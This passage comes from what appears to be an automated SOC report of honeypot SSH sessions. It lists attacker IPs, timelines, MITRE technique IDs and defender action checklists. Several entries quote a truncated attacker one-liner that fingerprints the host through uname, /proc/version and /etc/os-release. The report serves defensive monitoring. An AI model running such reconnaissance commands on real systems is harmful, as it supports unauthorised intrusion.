**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-512fa9adbcad

| Field | Detail |
|---|---|
| **Source IP** | `5.11.162[.]163` |
| **First Seen** | 2026-07-10 11:09 |
| **Last Seen** | 2026-07-10 11:09 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:09:19` | `cowrie.session.connect` |
| `2026-07-10 11:09:21` | `cowrie.client.version` |
| `2026-07-10 11:09:21` | `cowrie.client.kex` |
| `2026-07-10 11:09:24` | `cowrie.login.success` |
| `2026-07-10 11:09:25` | `cowrie.direct-tcpip.request` |
| `2026-07-10 11:09:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.11.162[.]163` to AbuseIPDB if not already reported
- [ ] Block `5.11.162[.]163` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ea70f651b72

| Field | Detail |
|---|---|
| **Source IP** | `116.48.151[.]136` |
| **First Seen** | 2026-07-10 11:09 |
| **Last Seen** | 2026-07-10 11:09 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:09:31` | `cowrie.session.connect` |
| `2026-07-10 11:09:32` | `cowrie.client.version` |
| `2026-07-10 11:09:32` | `cowrie.client.kex` |
| `2026-07-10 11:09:35` | `cowrie.login.success` |
| `2026-07-10 11:09:35` | `cowrie.direct-tcpip.request` |
| `2026-07-10 11:09:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.48.151[.]136` to AbuseIPDB if not already reported
- [ ] Block `116.48.151[.]136` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-709d92ca5ca2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:09 |
| **Last Seen** | 2026-07-10 11:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:09:52` | `cowrie.session.connect` |
| `2026-07-10 11:09:53` | `cowrie.client.version` |
| `2026-07-10 11:09:53` | `cowrie.client.kex` |
| `2026-07-10 11:09:54` | `cowrie.login.success` |
| `2026-07-10 11:09:56` | `cowrie.session.params` |
| `2026-07-10 11:09:56` | `cowrie.command.input` |
| `2026-07-10 11:09:56` | `cowrie.command.input` |
| `2026-07-10 11:09:56` | `cowrie.command.input` |
| `2026-07-10 11:09:56` | `cowrie.command.input` |
| `2026-07-10 11:09:56` | `cowrie.command.input` |
| `2026-07-10 11:09:56` | `cowrie.command.success` |
| `2026-07-10 11:09:56` | `cowrie.command.input` |
| `2026-07-10 11:09:56` | `cowrie.command.input` |
| `2026-07-10 11:09:56` | `cowrie.command.input` |
| `2026-07-10 11:09:56` | `cowrie.command.input` |
| `2026-07-10 11:09:56` | `cowrie.log.closed` |
| `2026-07-10 11:09:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-947c51535cbe

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:11 |
| **Last Seen** | 2026-07-10 11:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:11:04` | `cowrie.session.connect` |
| `2026-07-10 11:11:04` | `cowrie.client.version` |
| `2026-07-10 11:11:04` | `cowrie.client.kex` |
| `2026-07-10 11:11:05` | `cowrie.login.success` |
| `2026-07-10 11:11:07` | `cowrie.session.params` |
| `2026-07-10 11:11:07` | `cowrie.command.input` |
| `2026-07-10 11:11:07` | `cowrie.command.input` |
| `2026-07-10 11:11:07` | `cowrie.command.input` |
| `2026-07-10 11:11:07` | `cowrie.command.input` |
| `2026-07-10 11:11:07` | `cowrie.command.input` |
| `2026-07-10 11:11:07` | `cowrie.command.success` |
| `2026-07-10 11:11:07` | `cowrie.command.input` |
| `2026-07-10 11:11:07` | `cowrie.command.input` |
| `2026-07-10 11:11:07` | `cowrie.command.input` |
| `2026-07-10 11:11:07` | `cowrie.command.input` |
| `2026-07-10 11:11:07` | `cowrie.log.closed` |
| `2026-07-10 11:11:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba8b99f0b2a4

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-10 11:11 |
| **Last Seen** | 2026-07-10 11:11 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:11:13` | `cowrie.session.connect` |
| `2026-07-10 11:11:14` | `cowrie.client.version` |
| `2026-07-10 11:11:14` | `cowrie.client.kex` |
| `2026-07-10 11:11:19` | `cowrie.login.success` |
| `2026-07-10 11:11:24` | `cowrie.session.params` |
| `2026-07-10 11:11:24` | `cowrie.command.input` |
| `2026-07-10 11:11:25` | `cowrie.log.closed` |
| `2026-07-10 11:11:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-501c3263673b

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]59` |
| **First Seen** | 2026-07-10 11:11 |
| **Last Seen** | 2026-07-10 11:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:11:57` | `cowrie.session.connect` |
| `2026-07-10 11:11:57` | `cowrie.client.version` |
| `2026-07-10 11:11:57` | `cowrie.client.kex` |
| `2026-07-10 11:11:58` | `cowrie.login.success` |
| `2026-07-10 11:11:59` | `cowrie.direct-tcpip.request` |
| `2026-07-10 11:12:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]59` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f33b0cc506e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:12 |
| **Last Seen** | 2026-07-10 11:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:12:16` | `cowrie.session.connect` |
| `2026-07-10 11:12:16` | `cowrie.client.version` |
| `2026-07-10 11:12:16` | `cowrie.client.kex` |
| `2026-07-10 11:12:18` | `cowrie.login.success` |
| `2026-07-10 11:12:19` | `cowrie.session.params` |
| `2026-07-10 11:12:19` | `cowrie.command.input` |
| `2026-07-10 11:12:19` | `cowrie.command.input` |
| `2026-07-10 11:12:19` | `cowrie.command.input` |
| `2026-07-10 11:12:19` | `cowrie.command.input` |
| `2026-07-10 11:12:19` | `cowrie.command.input` |
| `2026-07-10 11:12:19` | `cowrie.command.success` |
| `2026-07-10 11:12:19` | `cowrie.command.input` |
| `2026-07-10 11:12:19` | `cowrie.command.input` |
| `2026-07-10 11:12:19` | `cowrie.command.input` |
| `2026-07-10 11:12:19` | `cowrie.command.input` |
| `2026-07-10 11:12:19` | `cowrie.log.closed` |
| `2026-07-10 11:12:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bd60fd5ef8f

| Field | Detail |
|---|---|
| **Source IP** | `118.43.231[.]252` |
| **First Seen** | 2026-07-10 11:12 |
| **Last Seen** | 2026-07-10 11:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:12:47` | `cowrie.session.connect` |
| `2026-07-10 11:12:48` | `cowrie.client.version` |
| `2026-07-10 11:12:48` | `cowrie.client.kex` |
| `2026-07-10 11:12:50` | `cowrie.login.success` |
| `2026-07-10 11:12:50` | `cowrie.direct-tcpip.request` |
| `2026-07-10 11:12:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.43.231[.]252` to AbuseIPDB if not already reported
- [ ] Block `118.43.231[.]252` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29489ec6dfe0

| Field | Detail |
|---|---|
| **Source IP** | `5.11.162[.]163` |
| **First Seen** | 2026-07-10 11:13 |
| **Last Seen** | 2026-07-10 11:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:13:00` | `cowrie.session.connect` |
| `2026-07-10 11:13:01` | `cowrie.client.version` |
| `2026-07-10 11:13:01` | `cowrie.client.kex` |
| `2026-07-10 11:13:03` | `cowrie.login.success` |
| `2026-07-10 11:13:04` | `cowrie.direct-tcpip.request` |
| `2026-07-10 11:13:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.11.162[.]163` to AbuseIPDB if not already reported
- [ ] Block `5.11.162[.]163` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ebdfb0055d5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:13 |
| **Last Seen** | 2026-07-10 11:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:13:30` | `cowrie.session.connect` |
| `2026-07-10 11:13:30` | `cowrie.client.version` |
| `2026-07-10 11:13:30` | `cowrie.client.kex` |
| `2026-07-10 11:13:31` | `cowrie.login.success` |
| `2026-07-10 11:13:33` | `cowrie.session.params` |
| `2026-07-10 11:13:33` | `cowrie.command.input` |
| `2026-07-10 11:13:33` | `cowrie.command.input` |
| `2026-07-10 11:13:33` | `cowrie.command.input` |
| `2026-07-10 11:13:33` | `cowrie.command.input` |
| `2026-07-10 11:13:33` | `cowrie.command.input` |
| `2026-07-10 11:13:33` | `cowrie.command.success` |
| `2026-07-10 11:13:33` | `cowrie.command.input` |
| `2026-07-10 11:13:33` | `cowrie.command.input` |
| `2026-07-10 11:13:33` | `cowrie.command.input` |
| `2026-07-10 11:13:33` | `cowrie.command.input` |
| `2026-07-10 11:13:33` | `cowrie.log.closed` |
| `2026-07-10 11:13:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff9d86eced29

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:14 |
| **Last Seen** | 2026-07-10 11:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:14:45` | `cowrie.session.connect` |
| `2026-07-10 11:14:45` | `cowrie.client.version` |
| `2026-07-10 11:14:45` | `cowrie.client.kex` |
| `2026-07-10 11:14:47` | `cowrie.login.success` |
| `2026-07-10 11:14:48` | `cowrie.session.params` |
| `2026-07-10 11:14:48` | `cowrie.command.input` |
| `2026-07-10 11:14:48` | `cowrie.command.input` |
| `2026-07-10 11:14:48` | `cowrie.command.input` |
| `2026-07-10 11:14:48` | `cowrie.command.input` |
| `2026-07-10 11:14:48` | `cowrie.command.input` |
| `2026-07-10 11:14:48` | `cowrie.command.success` |
| `2026-07-10 11:14:48` | `cowrie.command.input` |
| `2026-07-10 11:14:48` | `cowrie.command.input` |
| `2026-07-10 11:14:48` | `cowrie.command.input` |
| `2026-07-10 11:14:48` | `cowrie.command.input` |
| `2026-07-10 11:14:48` | `cowrie.log.closed` |
| `2026-07-10 11:14:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14f9d5090d62

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:16 |
| **Last Seen** | 2026-07-10 11:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:16:00` | `cowrie.session.connect` |
| `2026-07-10 11:16:00` | `cowrie.client.version` |
| `2026-07-10 11:16:00` | `cowrie.client.kex` |
| `2026-07-10 11:16:01` | `cowrie.login.success` |
| `2026-07-10 11:16:03` | `cowrie.session.params` |
| `2026-07-10 11:16:03` | `cowrie.command.input` |
| `2026-07-10 11:16:03` | `cowrie.command.input` |
| `2026-07-10 11:16:03` | `cowrie.command.input` |
| `2026-07-10 11:16:03` | `cowrie.command.input` |
| `2026-07-10 11:16:03` | `cowrie.command.input` |
| `2026-07-10 11:16:03` | `cowrie.command.success` |
| `2026-07-10 11:16:03` | `cowrie.command.input` |
| `2026-07-10 11:16:03` | `cowrie.command.input` |
| `2026-07-10 11:16:03` | `cowrie.command.input` |
| `2026-07-10 11:16:03` | `cowrie.command.input` |
| `2026-07-10 11:16:03` | `cowrie.log.closed` |
| `2026-07-10 11:16:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4af7a539373

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:17 |
| **Last Seen** | 2026-07-10 11:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:17:13` | `cowrie.session.connect` |
| `2026-07-10 11:17:13` | `cowrie.client.version` |
| `2026-07-10 11:17:13` | `cowrie.client.kex` |
| `2026-07-10 11:17:15` | `cowrie.login.success` |
| `2026-07-10 11:17:16` | `cowrie.session.params` |
| `2026-07-10 11:17:16` | `cowrie.command.input` |
| `2026-07-10 11:17:16` | `cowrie.command.input` |
| `2026-07-10 11:17:16` | `cowrie.command.input` |
| `2026-07-10 11:17:16` | `cowrie.command.input` |
| `2026-07-10 11:17:16` | `cowrie.command.input` |
| `2026-07-10 11:17:16` | `cowrie.command.success` |
| `2026-07-10 11:17:16` | `cowrie.command.input` |
| `2026-07-10 11:17:16` | `cowrie.command.input` |
| `2026-07-10 11:17:16` | `cowrie.command.input` |
| `2026-07-10 11:17:16` | `cowrie.command.input` |
| `2026-07-10 11:17:16` | `cowrie.log.closed` |
| `2026-07-10 11:17:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f7a49207245

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:18 |
| **Last Seen** | 2026-07-10 11:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:18:26` | `cowrie.session.connect` |
| `2026-07-10 11:18:26` | `cowrie.client.version` |
| `2026-07-10 11:18:26` | `cowrie.client.kex` |
| `2026-07-10 11:18:27` | `cowrie.login.success` |
| `2026-07-10 11:18:29` | `cowrie.session.params` |
| `2026-07-10 11:18:29` | `cowrie.command.input` |
| `2026-07-10 11:18:29` | `cowrie.command.input` |
| `2026-07-10 11:18:29` | `cowrie.command.input` |
| `2026-07-10 11:18:29` | `cowrie.command.input` |
| `2026-07-10 11:18:29` | `cowrie.command.input` |
| `2026-07-10 11:18:29` | `cowrie.command.success` |
| `2026-07-10 11:18:29` | `cowrie.command.input` |
| `2026-07-10 11:18:29` | `cowrie.command.input` |
| `2026-07-10 11:18:29` | `cowrie.command.input` |
| `2026-07-10 11:18:29` | `cowrie.command.input` |
| `2026-07-10 11:18:29` | `cowrie.log.closed` |
| `2026-07-10 11:18:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae745273537c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:19 |
| **Last Seen** | 2026-07-10 11:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:19:38` | `cowrie.session.connect` |
| `2026-07-10 11:19:38` | `cowrie.client.version` |
| `2026-07-10 11:19:38` | `cowrie.client.kex` |
| `2026-07-10 11:19:40` | `cowrie.login.success` |
| `2026-07-10 11:19:41` | `cowrie.session.params` |
| `2026-07-10 11:19:41` | `cowrie.command.input` |
| `2026-07-10 11:19:41` | `cowrie.command.input` |
| `2026-07-10 11:19:41` | `cowrie.command.input` |
| `2026-07-10 11:19:41` | `cowrie.command.input` |
| `2026-07-10 11:19:41` | `cowrie.command.input` |
| `2026-07-10 11:19:41` | `cowrie.command.success` |
| `2026-07-10 11:19:41` | `cowrie.command.input` |
| `2026-07-10 11:19:41` | `cowrie.command.input` |
| `2026-07-10 11:19:41` | `cowrie.command.input` |
| `2026-07-10 11:19:41` | `cowrie.command.input` |
| `2026-07-10 11:19:41` | `cowrie.log.closed` |
| `2026-07-10 11:19:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33dce2e6969d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:20 |
| **Last Seen** | 2026-07-10 11:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
